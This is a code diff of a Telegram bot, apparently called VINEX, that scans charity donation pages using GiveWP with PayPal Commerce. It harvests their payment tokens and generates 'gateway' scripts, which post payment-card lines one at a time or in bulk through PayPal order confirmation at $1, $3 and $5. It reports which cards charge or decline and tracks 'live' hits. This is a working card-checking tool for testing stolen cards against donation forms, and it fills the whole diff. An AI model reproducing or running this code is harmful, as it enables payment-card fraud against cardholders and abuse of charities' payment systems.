+    def _confirm(self, oid, n, mm, yy, cvc):
         try:
-            he = {"authorization": "Bearer " + (self.au or ""),
-                  "paypal-client-metadata-id": self.paypal_meta or self.client_id or "",
+            he = {"authorization": "Bearer " + (ACCESS_TOKEN or ""),
+                  "paypal-client-metadata-id": PAYPAL_META or CLIENT_ID or "",
                   "content-type": "application/json",
-                  "origin": "https://" + HOST,
-                  "referer": PAGE_URL}
+                  "origin": "https://" + HOST, "referer": PAGE_URL}
             expiry = "20%s-%s" % (yy, mm)
-            da = {"payment_source": {"card": {"number": n, "expiry": expiry,
-                  "security_code": cvc,
+            da = {"payment_source": {"card": {"number": n, "expiry": expiry, "security_code": cvc,
                   "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}}},
                   "application_context": {"vault": False}}
-            cr = self.r.post(
-                "https://cors.api.paypal.com/v2/checkout/orders/" + order_id + "/confirm-payment-source",
+            cr = self.r.post("https://cors.api.paypal.com/v2/checkout/orders/" + oid + "/confirm-payment-source",
                 headers=he, json=da, timeout=20)
             return cr.text or ""
-        except Exception: return ""
+        except: return ""
 
-    def _approve(self, order_id, amt, pid):
+    def _approve(self, oid, amt, pid):
         try:
-            form_data = {
-                "give-form-id-prefix": self.id_form1 or "",
-                "give-form-id": self.id_form2 or "",
-                "give-form-hash": self.nonce or "",
-                "give-amount": amt,
-                "give-currency": self.currency,
-                "payment-mode": "paypal-commerce",
-                "give_first": random.choice(FIRST_NAMES),
-                "give_last": random.choice(LAST_NAMES),
-                "give_email": self.email,
-                "give-gateway": "paypal-commerce",
-                "give_agree_to_terms": "on",
-            }
-            if pid is not None: form_data["give-price-id"] = pid
-            form_data = self._autofill(form_data)
-            da = MultipartEncoder({k: (None, str(v)) for k, v in form_data.items()})
-            r = self.r.post(
-                self.ajax_url,
-                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
-                headers={"content-type": da.content_type,
-                         "x-requested-with": "XMLHttpRequest",
-                         "referer": PAGE_URL,
-                         "origin": "https://" + HOST},
-                data=da, timeout=20)
+            fd = {"give-form-id-prefix": ID_FORM1, "give-form-id": ID_FORM2,
+                  "give-form-hash": NONCE, "give-amount": amt, "give-currency": CURRENCY,
+                  "payment-mode": "paypal-commerce", "give_first": random.choice(FIRST_NAMES),
+                  "give_last": random.choice(LAST_NAMES), "give_email": self.email,
+                  "give-gateway": "paypal-commerce", "give_agree_to_terms": "on"}
+            if pid is not None: fd["give-price-id"] = pid
+            fd = self._autofill(fd)
+            da = MultipartEncoder({k: (None, str(v)) for k, v in fd.items()})
+            r = self.r.post(AJAX_URL, params={"action": "give_paypal_commerce_approve_order", "order": oid},
+                headers={"content-type": da.content_type, "x-requested-with": "XMLHttpRequest",
+                         "referer": PAGE_URL, "origin": "https://" + HOST}, data=da, timeout=20)
             return r.text or ""
-        except Exception: return ""
+        except: return ""
 
-    def _build_pids(self):
+    def _pids(self):
         pids = []
-        if self.current_pid: pids.append(self.current_pid)
+        if CURRENT_PID: pids.append(CURRENT_PID)
         for pid, _ in (PRICE_LEVELS or []):
             if pid and pid not in pids: pids.append(pid)
         for p in ("custom", "3", "4", "1", "2", "5", "", None):
@@ -1916,116 +1843,85 @@ class PayPal:
             ccx = ccx.strip().replace(" ", "")
             parts = re.split(r"[|:/]", ccx)
             if len(parts) < 4: return "INVALID_CARD_FORMAT"
-            n = re.sub(r"\D", "", parts[0])
-            mm = re.sub(r"\D", "", parts[1]).zfill(2)
-            yy = re.sub(r"\D", "", parts[2])
-            cvc = re.sub(r"\D", "", parts[3])
+            n = re.sub(r"\D", "", parts[0]); mm = re.sub(r"\D", "", parts[1]).zfill(2)
+            yy = re.sub(r"\D", "", parts[2]); cvc = re.sub(r"\D", "", parts[3])
             if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
             yy = yy.zfill(2)
             if not luhn_check(n): return "INVALID_CARD_NUMBER"
-
-            pids = self._build_pids()
+            pids = self._pids()
             amounts = list(BASE_AMOUNTS)
-            try:
-                min_val = float(MINIMUM)
-                if min_val > 5.00:
-                    m = "%0.2f" % min_val
-                    if m not in amounts: amounts.append(m)
-            except Exception: pass
-
-            create_errors = []
-            best_decline = None
-
+            errors = []
+            best = None
             for amt in amounts:
                 self.donation = amt
-                order_id = None
-                last_err = None
+                oid = None; last = None
                 for pid in pids:
-                    oid, err = self._create_order(amt, pid)
-                    if oid:
-                        order_id = oid
-                        break
-                    last_err = err
-                if not order_id:
-                    if last_err: create_errors.append((amt, last_err))
+                    o, e = self._create(amt, pid)
+                    if o: oid = o; break
+                    last = e
+                if not oid:
+                    if last: errors.append((amt, last))
                     continue
-
-                confirm = self._confirm(order_id, n, mm, yy, cvc)
-                confirm_raw = extract_response_text(confirm)
-                if confirm_raw and is_card_decline(confirm_raw):
-                    return confirm_raw
-
+                conf = self._confirm(oid, n, mm, yy, cvc)
+                cr = extract_response_text(conf)
+                if cr and is_card_decline(cr): return cr
                 for pid in pids:
-                    text = self._approve(order_id, amt, pid)
-                    combined = text + "\n" + confirm
-                    lower = combined.lower()
-                    if '"success":true' in lower and '"error"' not in lower:
+                    t = self._approve(oid, amt, pid) + "\n" + conf
+                    if '"success":true' in t.lower() and '"error"' not in t.lower():
                         return "CHARGE %s$" % amt
-                    raw = extract_response_text(text) or extract_response_text(confirm)
-                    if raw and is_card_decline(raw):
-                        if not best_decline:
-                            best_decline = raw
-
-            if best_decline: return best_decline[:300]
-            if create_errors:
-                last_amt, last_err = create_errors[-1]
-                self.donation = last_amt
-                if last_err and last_err.strip(): return last_err[:300]
-            return "ORDER_CREATE_FAILED (no response)"
-        except Exception as e:
-            return "FATAL_%s: %s" % (type(e).__name__, str(e)[:100])
-
+                    raw = extract_response_text(t) or extract_response_text(conf)
+                    if raw and is_card_decline(raw) and not best:
+                        best = raw
+            if best: return best[:300]
+            if errors:
+                _, last = errors[-1]
+                if last: return last[:300]
+            return "ORDER_CREATE_FAILED"
+        except Exception as e: return "FATAL_%s" % type(e).__name__
 
 def single_check():
-    print("\n--- Single Card ---")
+    print("\n--- Single ---")
     try:
-        card = input("Card (num|mm|yy|cvc): ").strip()
-        if not card: return
-        p = PayPal()
-        print("Response:", p.Charge(card))
-    except Exception as e: print("Error:", e)
-
+        c = input("Card (num|mm|yy|cvc): ").strip()
+        if not c: return
+        p = PayPal(); print("→", p.Charge(c))
+    except Exception as e: print("Err:", e)
 
 def file_check():
-    print("\n--- File Check ---")
+    print("\n--- File ---")
     try:
         path = input("File: ").strip()
         if not os.path.exists(path): print("Not found"); return
-        with open(path, "r", encoding="utf-8", errors="ignore") as f:
-            cards = [l.strip() for l in f if l.strip()]
-        out = "results_%d.txt" % int(time.time())
-        with open(out, "w", encoding="utf-8") as fo:
+        with open(path) as f: cards = [l.strip() for l in f if l.strip()]
+        out = "vinex_%d.txt" % int(time.time())
+        with open(out, "w") as fo:
             for i, c in enumerate(cards, 1):
                 try:
-                    p = PayPal(); res = p.Charge(c)
-                    line = "%s => %s" % (c, res)
+                    p = PayPal(); r = p.Charge(c)
+                    line = "%s => %s" % (c, r)
                     print("[%d/%d] %s" % (i, len(cards), line))
                     fo.write(line + "\n"); fo.flush()
-                    time.sleep(0.3)
-                except Exception: continue
+                except: pass
         print("Saved:", out)
-    except Exception as e: print("Error:", e)
-
+    except Exception as e: print("Err:", e)
 
 def main():
-    print("=" * 60)
-    print("  Gateway v20.1 — 1$→3$→5$ | Real responses")
+    print("=" * 50)
+    print("  VINEX Gateway v21 — 1→3→5$")
     print("  " + PAGE_URL)
-    print("=" * 60)
+    print("=" * 50)
     while True:
         try:
-            print("\n[1] Single  [2] File  [0] Exit")
-            c = input("Choose: ").strip()
+            c = input("\n[1] Single  [2] File  [0] Exit: ").strip()
             if c == "1": single_check()
             elif c == "2": file_check()
             elif c == "0": break
         except KeyboardInterrupt: break
-        except Exception: continue
-
+        except: continue
 
 if __name__ == "__main__":
     try: main()
-    except Exception: pass
+    except: pass
 '''
 
 _GATEWAY_TEMPLATE = Template(GATEWAY_TEMPLATE_STR)
@@ -2076,9 +1972,9 @@ def generate_gateway_code(result, link, tester=None):
         display_result=display_result,
     )
 
-# ================================================================
-#  BOT HANDLERS
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🎭 BOT HANDLERS — VINEX STYLE
+# ═════════════════════════════════════════════════════════════════
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     try:
@@ -2089,22 +1985,30 @@ def cmd_start(message):
         uid = message.from_user.id
         name = message.from_user.first_name or 'User'
         text = (
-            f'[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 v20.1 🌟\n'
-            f'[⚡] Name: {name}\n'
-            f'[⚡] ID: <code>{uid}</code>\n'
-            '- - - - - - - - - - - - - - - - - -\n'
-            '[⚡] /paypal &lt;link&gt;\n'
-            '[⚡] /mass — bulk\n'
-            '[⚡] /resume /stop\n'
-            '[⚡] /stats /ping /help\n'
-            '[⚡] /diag — diagnostics\n'
-            '- - - - - - - - - - - - - - - - - -\n'
-            '[⚡] v20.1: 1$ → 3$ → 5$ | Real responses'
+            f'{vinex_header("Welcome aboard!")}\n\n'
+            f'😎 <b>Hey {name}!</b>\n'
+            f'🆔 <b>Your ID:</b> <code>{uid}</code>\n\n'
+            f'🌟 <b>What I can do for you:</b>\n'
+            f'  ⚡ <code>/paypal &lt;url&gt;</code> — single scan\n'
+            f'  📦 <code>/mass</code> — bulk scan (send .txt)\n'
+            f'  ♻️ <code>/resume</code> — continue last job\n'
+            f'  🛑 <code>/stop</code> — halt running job\n'
+            f'  🔬 <code>/diag &lt;url&gt;</code> — deep diagnostics\n'
+            f'  📊 <code>/stats</code> — bot statistics\n'
+            f'  💡 <code>/help</code> — full guide\n\n'
+            f'🎯 <b>Mode:</b> <i>1$ → 3$ → 5$ progressive</i>\n'
+            f'🎨 <b>Style:</b> <i>Bold • Precise • Playful</i>\n'
+            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
+            f'💎 <b>Let\'s find some gems!</b>'
         )
         kb = types.InlineKeyboardMarkup(row_width=2)
         kb.add(
-            types.InlineKeyboardButton('📊 Stats', callback_data='stats'),
-            types.InlineKeyboardButton('📩 Feedback', callback_data='yrr'),
+            vinex_btn('Stats', 'primary', callback_data='stats'),
+            vinex_btn('Help', 'info', callback_data='help'),
+        )
+        kb.add(
+            vinex_btn('Scan a URL', 'success', callback_data='howto_paypal'),
+            vinex_btn('Stop', 'danger', callback_data='stop'),
         )
         safe_send_message(message.chat.id, text, reply_markup=kb)
     except Exception:
@@ -2114,19 +2018,29 @@ def cmd_start(message):
 @bot.message_handler(commands=['help'])
 def cmd_help(message):
     try:
-        safe_send_message(
-            message.chat.id,
-            '<b>📖 v20.1 Guide</b>\n\n'
-            '<code>/paypal URL</code> — Single check\n'
-            '  → 1$ → 3$ → 5$ progressive\n'
-            '  → Real PayPal responses\n'
-            '  → File sent on success\n\n'
-            '<code>/mass</code> — .txt file bulk scan\n'
-            '  → Each live link = separate file, sent in order\n'
-            '  → Smart dedup (http/https, www, trailing / ignored)\n\n'
-            '<code>/diag URL</code> — Full pipeline report\n'
-            '<code>/stats /ping /stop /resume</code>',
+        text = (
+            f'{vinex_header("The Manual")}\n\n'
+            f'🔍 <b>Single Scan</b>\n'
+            f'  <code>/paypal https://example.com/donate</code>\n'
+            f'  ▸ Warmup → JS hunt → Token validate\n'
+            f'  ▸ Charges: <b>$1 → $3 → $5</b>\n'
+            f'  ▸ Real PayPal responses (no faking)\n'
+            f'  ▸ Gateway file sent on LIVE\n\n'
+            f'📦 <b>Bulk Scan</b>\n'
+            f'  <code>/mass</code> → upload .txt (max 10MB)\n'
+            f'  ▸ Each LIVE link = separate file\n'
+            f'  ▸ Smart dedup (http/https/www/slash)\n'
+            f'  ▸ Nonce auto-refresh every 50\n\n'
+            f'🛑 <b>Control</b>\n'
+            f'  <code>/stop</code> — graceful stop\n'
+            f'  <code>/resume</code> — continue\n\n'
+            f'🔬 <b>Diagnostics</b> (admin)\n'
+            f'  <code>/diag URL</code> — full pipeline report\n\n'
+            f'🎨 <i>VINEX v21 — Built with love 💚</i>'
         )
+        kb = types.InlineKeyboardMarkup()
+        kb.add(vinex_btn('Back to Menu', 'primary', callback_data='back_start'))
+        safe_send_message(message.chat.id, text, reply_markup=kb)
     except Exception:
         pass
 
@@ -2135,11 +2049,18 @@ def cmd_help(message):
 def cmd_ping(message):
     try:
         t0 = time.time()
-        sent = safe_send_message(message.chat.id, '🏓 Pong...')
+        sent = safe_send_message(message.chat.id, '🏓 <b>Pinging...</b>')
         dt = (time.time() - t0) * 1000
         if sent:
-            safe_edit_message(message.chat.id, sent.message_id,
-                              f'🏓 <b>Pong!</b>\n⏱️ <code>{dt:.0f}ms</code>\n🤖 v20.1')
+            safe_edit_message(
+                message.chat.id, sent.message_id,
+                f'🏓 <b>PONG!</b>\n'
+                f'━━━━━━━━━━━━━━━\n'
+                f'⚡ <b>Latency:</b> <code>{dt:.0f} ms</code>\n'
+                f'🤖 <b>Bot:</b> <code>VINEX v21</code>\n'
+                f'💾 <b>Users:</b> <code>{len(open(USERS_FILE).read().splitlines())}</code>\n'
+                f'{playful("fun")} <i>Alive and kicking!</i>'
+            )
     except Exception:
         pass
 
@@ -2151,16 +2072,22 @@ def cmd_stats(message):
         users_n = len(open(USERS_FILE).read().splitlines())
         rate = (s.get('live', 0) / s.get('checks', 1) * 100
                 if s.get('checks', 0) else 0)
-        safe_send_message(
-            message.chat.id,
-            f'📊 <b>Stats v20.1</b>\n'
-            f'━━━━━━━━━━━━━━━━━━━━\n'
-            f'👥 Users: <code>{users_n}</code>\n'
-            f'🔍 Checks: <code>{s.get("checks", 0)}</code>\n'
-            f'✅ Live: <code>{s.get("live", 0)}</code>\n'
-            f'❌ Dead: <code>{s.get("dead", 0)}</code>\n'
-            f'📈 Rate: <code>{rate:.1f}%</code>',
+        # Visual bar
+        filled = int(rate / 5)
+        bar = '█' * filled + '░' * (20 - filled)
+        text = (
+            f'{vinex_header("Global Statistics")}\n\n'
+            f'👥 <b>Users:</b> <code>{users_n}</code>\n'
+            f'🔍 <b>Total checks:</b> <code>{s.get("checks", 0)}</code>\n'
+            f'✅ <b>Live:</b> <code>{s.get("live", 0)}</code>\n'
+            f'❌ <b>Dead:</b> <code>{s.get("dead", 0)}</code>\n'
+            f'━━━━━━━━━━━━━━━\n'
+            f'📈 <b>Live rate:</b>\n'
+            f'<code>{bar}</code> <b>{rate:.1f}%</b>\n'
+            f'━━━━━━━━━━━━━━━\n'
+            f'{playful("success")} <i>Keep the gems coming!</i>'
         )
+        safe_send_message(message.chat.id, text)
     except Exception:
         pass
 
@@ -2183,11 +2110,14 @@ def cmd_paypal(message):
         chat_id = message.chat.id
         parts = message.text.split(maxsplit=1)
         if len(parts) != 2:
-            safe_send_message(chat_id, '📌 <code>/paypal URL</code>')
+            safe_send_message(
+                chat_id,
+                f'🎯 <b>Usage:</b>\n<code>/paypal URL</code>',
+            )
             return
         link = safe_url(parts[1].strip())
         if not link:
-            safe_send_message(chat_id, '❌ Invalid link.')
+            safe_send_message(chat_id, '❌ <b>Invalid link format.</b>')
             return
 
         lkey = f'{uid}:{normalize_url_key(link)}'
@@ -2195,20 +2125,27 @@ def cmd_paypal(message):
             elapsed = now - link_cooldowns[lkey]
             if elapsed < LINK_COOLDOWN:
                 rem = int(LINK_COOLDOWN - elapsed)
-                safe_send_message(chat_id, f'⏳ Wait {rem}s before retrying this link.')
+                safe_send_message(
+                    chat_id,
+                    f'⏳ <b>Cooling down...</b> {rem}s left for this link.',
+                )
                 return
         link_cooldowns[lkey] = now
 
         ko = safe_send_message(
             chat_id,
-            '🔍 <b>v20.1 Omni-Scan</b>\n'
-            'Warmup → JS → Validate → Charge (1$→3$→5$)',
+            f'{playful("working")} <b>VINEX SCAN INITIATED</b>\n'
+            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
+            f'🔍 <i>Warming up session...</i>\n'
+            f'💉 <i>Hunting tokens across JS/HTML/AJAX...</i>\n'
+            f'🎯 <i>Target amounts:</i> <b>$1 → $3 → $5</b>\n'
+            f'━━━━━━━━━━━━━━━━━━━━━━━',
         )
         if not ko:
             return
 
         bump_stat('checks')
-        tester = PayPalTester(link)
+        tester = VinexTester(link)
         tester.Key()
         result = tester.Charge(TEST_CARD, thorough=True)
         live = is_live_response(result) and not is_dead_response(result)
@@ -2217,12 +2154,15 @@ def cmd_paypal(message):
             bump_stat('dead')
             safe_edit_message(
                 chat_id, ko.message_id,
-                f'❌ <b>Not Live</b>\n'
+                f'{playful("dead")} <b>NO LUCK THIS TIME</b>\n'
+                f'━━━━━━━━━━━━━━━━━━━━━━━\n'
                 f'🔗 <code>{link[:100]}</code>\n\n'
-                f'📝 Response:\n<code>{str(result)[:250]}</code>\n'
-                f'🔐 Auth: <code>{tester.auth_method}</code>\n'
-                f'🌐 GW: <code>{tester.gateway_type}</code>\n'
-                f'🎯 Candidates: <code>{len(tester.token_candidates)}</code>',
+                f'📝 <b>Response:</b>\n'
+                f'<code>{str(result)[:250]}</code>\n'
+                f'━━━━━━━━━━━━━━━━━━━━━━━\n'
+                f'🔐 <b>Auth:</b> <code>{tester.auth_method}</code>\n'
+                f'🌐 <b>GW:</b> <code>{tester.gateway_type}</code>\n'
+                f'🎯 <b>Candidates:</b> <code>{len(tester.token_candidates)}</code>',
             )
             return
 
@@ -2230,53 +2170,57 @@ def cmd_paypal(message):
         try:
             code = generate_gateway_code(result, link, tester)
             if not code or len(code) < 500:
-                raise Exception(f'Generated code too small: {len(code)}b')
+                raise Exception(f'Too small: {len(code)}b')
         except Exception as e:
             safe_edit_message(
                 chat_id, ko.message_id,
-                f'❌ Gateway gen error: <code>{str(e)[:200]}</code>',
+                f'❌ <b>Gateway error:</b>\n<code>{str(e)[:200]}</code>',
             )
             return
 
-        fname = f'gateway_v20.1_{int(time.time())}_{uid}.py'
+        fname = f'vinex_gateway_{int(time.time())}_{uid}.py'
         try:
             with open(fname, 'w', encoding='utf-8') as f:
                 f.write(code)
-            log.info(f'Gateway file written: {fname} ({len(code)}b)')
+            log.info(f'VINEX gateway: {fname} ({len(code)}b)')
         except Exception as e:
             safe_edit_message(
                 chat_id, ko.message_id,
-                f'❌ File write error: <code>{str(e)[:200]}</code>',
+                f'❌ <b>File error:</b>\n<code>{str(e)[:200]}</code>',
             )
             return
 
         display = normalize_result(result)[:150]
         is_charge = 'CHARGE' in str(result).upper()
-        tag = '💰 CHARGE' if is_charge else '💳 Card Declined (Gateway OK)'
+        tag = '💰 <b>CHARGE!</b>' if is_charge else '💳 <b>Gateway LIVE</b>'
         caption = (
-            f'✅ <b>{tag} — v20.1</b>\n'
-            f'━━━━━━━━━━━━━━━━━━━━\n'
+            f'{playful("live")} <b>VINEX — {tag}</b>\n'
+            f'╔══════════════════════════╗\n'
+            f'║  🔗 TARGET ACHIEVED      ║\n'
+            f'╚══════════════════════════╝\n'
             f'🔗 <code>{link[:100]}</code>\n'
-            f'━━━━━━━━━━━━━━━━━━━━\n'
-            f'💬 Response:\n<code>{display}</code>\n'
-            f'💰 Amount: <code>${tester.donation}</code>\n'
-            f'💱 Currency: <code>{tester.currency}</code>\n'
-            f'🔐 Auth: <code>{tester.auth_method}</code>\n'
-            f'🌐 GW: <code>{tester.gateway_type}</code>\n'
-            f'━━━━━━━━━━━━━━━━━━━━\n'
-            f'1$ → 3$ → 5$'
+            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
+            f'💬 <b>Response:</b>\n'
+            f'<code>{display}</code>\n'
+            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
+            f'💰 <b>Amount:</b> <code>${tester.donation}</code>\n'
+            f'💱 <b>Currency:</b> <code>{tester.currency}</code>\n'
+            f'🔐 <b>Auth:</b> <code>{tester.auth_method}</code>\n'
+            f'🌐 <b>GW:</b> <code>{tester.gateway_type}</code>\n'
+            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
+            f'⚡ <i>Amounts: 1$ → 3$ → 5$</i>\n'
+            f'🌟 <i>VINEX v21</i>'
         )
         sent = safe_send_document(chat_id, fname, caption=caption)
         if sent:
-            safe_edit_message(chat_id, ko.message_id, '✅ Done.')
-            log.info(f'Gateway delivered: {fname}')
+            safe_edit_message(chat_id, ko.message_id,
+                              f'{playful("success")} <b>Delivered!</b>')
+            log.info(f'VINEX delivered: {fname}')
         else:
             safe_edit_message(
                 chat_id, ko.message_id,
-                f'⚠️ File delivery failed.\n{display[:150]}',
+                f'⚠️ <b>File delivery failed</b>\n{display[:150]}',
             )
-            log.error(f'Gateway delivery FAILED: {fname}')
-
         if sent:
             try:
                 os.remove(fname)
@@ -2299,14 +2243,20 @@ def cmd_mass(message):
             return
         user_last_mass[uid] = now
         if mass_active.get(uid, False):
-            safe_send_message(message.chat.id, '⚠️ Job running. /stop first.')
+            safe_send_message(
+                message.chat.id,
+                '⚠️ <b>Job already running!</b>\nUse /stop first.',
+            )
             return
         msg = safe_send_message(
             message.chat.id,
-            '📁 Send a .txt file (max 10MB).\n'
-            '🔍 v20.1 Omni-Scan (1$→3$→5$)\n'
-            '🧹 Smart dedup (http/https/www/slash)\n'
-            '♻️ /resume to continue.',
+            f'{vinex_header("Bulk Mode")}\n\n'
+            f'📁 <b>Send your .txt file</b>\n'
+            f'  ▸ One URL per line\n'
+            f'  ▸ Max 10 MB\n'
+            f'  ▸ Smart dedup automatic\n\n'
+            f'🎯 <b>Amounts:</b> 1$ → 3$ → 5$\n'
+            f'♻️ <code>/resume</code> if interrupted',
         )
         if msg:
             bot.register_next_step_handler(msg, handle_mass_file)
@@ -2321,16 +2271,19 @@ def cmd_resume(message):
         chat_id = message.chat.id
         progress = load_progress(uid)
         if not progress:
-            safe_send_message(chat_id, '❌ No saved progress.')
+            safe_send_message(chat_id, '❌ <b>No saved progress.</b>')
             return
         total = progress.get('total', 0)
         processed = progress.get('processed', 0)
         if processed >= total:
-            safe_send_message(chat_id, f'✅ Complete ({processed}/{total})')
+            safe_send_message(chat_id, f'✅ <b>Already complete</b> ({processed}/{total})')
             clear_progress(uid)
             return
         links = progress.get('links', [])
-        safe_send_message(chat_id, f'♻️ Resuming {processed}/{total}...')
+        safe_send_message(
+            chat_id,
+            f'♻️ <b>Resuming...</b>\n📌 From {processed}/{total}',
+        )
         threading.Thread(
             target=run_mass_job,
             args=(chat_id, uid, links, processed, progress),
@@ -2346,9 +2299,9 @@ def cmd_stop(message):
         uid = message.from_user.id
         if mass_active.get(uid, False):
             mass_pause[uid] = True
-            safe_send_message(message.chat.id, '🛑 Stopping...')
+            safe_send_message(message.chat.id, '🛑 <b>Stopping...</b>')
         else:
-            safe_send_message(message.chat.id, '❌ No active job.')
+            safe_send_message(message.chat.id, '❌ <b>No active job.</b>')
     except Exception:
         pass
 
@@ -2356,22 +2309,48 @@ def cmd_stop(message):
 def handle_mass_file(message):
     try:
         if not message.document:
-            safe_send_message(message.chat.id, '❌ Send a .txt file.')
+            safe_send_message(message.chat.id, '❌ <b>Send a .txt file.</b>')
             return
         size = message.document.file_size or 0
         if size > MAX_FILE_SIZE:
             safe_send_message(
                 message.chat.id,
-                f'❌ File too large ({size // 1024} KB / max 10 MB).',
+                f'❌ <b>File too large</b>\n{size // 1024} KB / max 10 MB',
             )
             return
         uid = message.from_user.id
         chat_id = message.chat.id
-        file_info = bot.get_file(message.document.file_id)
-        downloaded = bot.download_file(file_info.file_path)
-        raw = downloaded.decode('utf-8', errors='ignore').splitlines()
 
-        # ✅ Smart dedup
+        # Resilient fetch
+        try:
+            file_info = retry_call(bot.get_file, message.document.file_id, retries=4)
+        except Exception as e:
+            log.error(f'get_file failed: {e}')
+            safe_send_message(
+                chat_id,
+                f'⚠️ <b>Network hiccup fetching file</b>\n'
+                f'<i>Please try again in a moment.</i>\n'
+                f'<code>{str(e)[:150]}</code>',
+            )
+            return
+
+        try:
+            downloaded = retry_call(bot.download_file, file_info.file_path, retries=4)
+        except Exception as e:
+            log.error(f'download_file failed: {e}')
+            safe_send_message(
+                chat_id,
+                f'⚠️ <b>Download timeout</b>\n'
+                f'<i>Retry in a moment.</i>\n'
+                f'<code>{str(e)[:150]}</code>',
+            )
+            return
+
+        if not downloaded:
+            safe_send_message(chat_id, '❌ <b>Empty file.</b>')
+            return
+
+        raw = downloaded.decode('utf-8', errors='ignore').splitlines()
         links = []
         seen = set()
         dupes = 0
@@ -2386,10 +2365,8 @@ def handle_mass_file(message):
             seen.add(key)
             links.append(s)
 
-        log.info(f'Mass: {len(links)} unique, {dupes} dupes skipped')
-
         if not links:
-            safe_send_message(chat_id, '❌ No valid URLs.')
+            safe_send_message(chat_id, '❌ <b>No valid URLs.</b>')
             return
 
         total = len(links)
@@ -2398,12 +2375,16 @@ def handle_mass_file(message):
             'links': links, 'started_at': time.time(),
         }
         save_progress(uid, progress)
-        dupe_msg = f'\n🗑️ Duplicates skipped: <b>{dupes}</b>' if dupes else ''
+        dupe_msg = f'\n🗑️ <b>Duplicates removed:</b> <code>{dupes}</code>' if dupes else ''
         safe_send_message(
             chat_id,
-            f'✅ Loaded <b>{total}</b> unique links.{dupe_msg}\n'
-            f'🔍 v20.1 THOROUGH (1$→3$→5$)\n'
-            f'🚀 Starting...',
+            f'{vinex_header("Ready to Roll!")}\n\n'
+            f'✅ <b>Loaded:</b> <code>{total}</code> unique links{dupe_msg}\n'
+            f'🔍 <b>Mode:</b> <i>THOROUGH</i>\n'
+            f'🎯 <b>Charges:</b> $1 → $3 → $5\n'
+            f'🚀 <b>Launching...</b>\n'
+            f'━━━━━━━━━━━━━━━━━━━\n'
+            f'{playful("fun")} <i>Let\'s go!</i>',
         )
         threading.Thread(
             target=run_mass_job,
@@ -2412,11 +2393,11 @@ def handle_mass_file(message):
         ).start()
     except Exception:
         log.exception('handle_mass_file')
-        safe_send_message(message.chat.id, '❌ Error processing file.')
+        safe_send_message(message.chat.id, '❌ <b>Error processing file.</b>')
 
-# ================================================================
-#  MASS JOB
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  📊 MASS JOB
+# ═════════════════════════════════════════════════════════════════
 def run_mass_job(chat_id, uid, links, start_idx, progress):
     total = len(links)
     processed = start_idx
@@ -2435,10 +2416,10 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
 
     status_msg = safe_send_message(
         chat_id,
-        f'📊 <b>Mass v20.1 Started</b>\n'
-        f'📌 Total: {total}\n'
-        f'🔍 THOROUGH (1$→3$→5$)\n'
-        f'⏳ Starting...',
+        f'{vinex_header("Mass Scan Running")}\n'
+        f'📌 Total: <code>{total}</code>\n'
+        f'🔍 Mode: <b>THOROUGH</b>\n'
+        f'⏳ <i>Preparing...</i>',
     )
 
     state = {'last_link': '', 'last_resp': '', 'last_live': False,
@@ -2462,20 +2443,22 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
                             f"<code>{state['last_link'][:60]}</code>\n"
                             f"💬 {state['last_resp'][:60]}")
                 else:
-                    last = '⏳ Waiting...'
-                st = ('🔄 <i>Checking...</i>' if state['status'] == 'checking'
+                    last = '⏳ <i>Waiting for first result...</i>'
+                st = ('🔄 <i>Deep-checking...</i>' if state['status'] == 'checking'
                       else '⏸️ <i>Moving...</i>')
                 text = (
-                    f'📊 <b>Mass v20.1</b>\n'
-                    f'━━━━━━━━━━━━━━━━━━\n'
-                    f'📌 {total}\n'
-                    f'✅ {live} | ❌ {dead}\n'
-                    f'⏳ {pct}% {bar}\n'
-                    f'━━━━━━━━━━━━━━━━━━\n'
+                    f'📊 <b>VINEX MASS SCAN</b>\n'
+                    f'━━━━━━━━━━━━━━━━━━━\n'
+                    f'📌 <b>Total:</b> <code>{total}</code>\n'
+                    f'✅ <b>Live:</b> <code>{live}</code>\n'
+                    f'❌ <b>Dead:</b> <code>{dead}</code>\n'
+                    f'⏳ <b>{pct}%</b> {bar}\n'
+                    f'━━━━━━━━━━━━━━━━━━━\n'
                     f'{last}\n'
-                    f'━━━━━━━━━━━━━━━━━━\n'
+                    f'━━━━━━━━━━━━━━━━━━━\n'
                     f'{st}\n'
-                    f'⚡ {spd:.2f}/s | ETA: {int(eta // 60)}m{int(eta % 60)}s'
+                    f'⚡ <b>Speed:</b> <code>{spd:.2f}/s</code>\n'
+                    f'🕐 <b>ETA:</b> <code>{int(eta // 60)}m {int(eta % 60)}s</code>'
                 )
                 safe_edit_message(chat_id, status_msg.message_id, text)
             except Exception:
@@ -2493,7 +2476,7 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
                 save_progress(uid, progress)
                 safe_send_message(
                     chat_id,
-                    f'🛑 Stopped at {processed}/{total}\n♻️ /resume',
+                    f'🛑 <b>Stopped</b>\n📌 At {processed}/{total}\n♻️ /resume',
                 )
                 return
             link = links[idx]
@@ -2528,10 +2511,13 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
                     cur = tester.currency if tester else 'USD'
                     auth = tester.auth_method if tester else 'none'
                     caption = (
-                        f'✅ <b>Live #{state["live_idx"]}</b>\n'
+                        f'{playful("live")} <b>LIVE #{state["live_idx"]}</b>\n'
+                        f'━━━━━━━━━━━━━━━━\n'
                         f'🔗 <code>{result["link"][:80]}</code>\n'
                         f'💬 {resp[:80]}\n'
-                        f'💰 ${result.get("amount", "1.00")} | {cur} | {auth}'
+                        f'💰 <b>${result.get("amount", "1.00")}</b> | {cur} | {auth}\n'
+                        f'━━━━━━━━━━━━━━━━\n'
+                        f'🌟 <i>VINEX v21</i>'
                     )
                     sent = safe_send_document(chat_id, gpath, caption=caption)
                     if sent:
@@ -2540,7 +2526,7 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
                         except Exception:
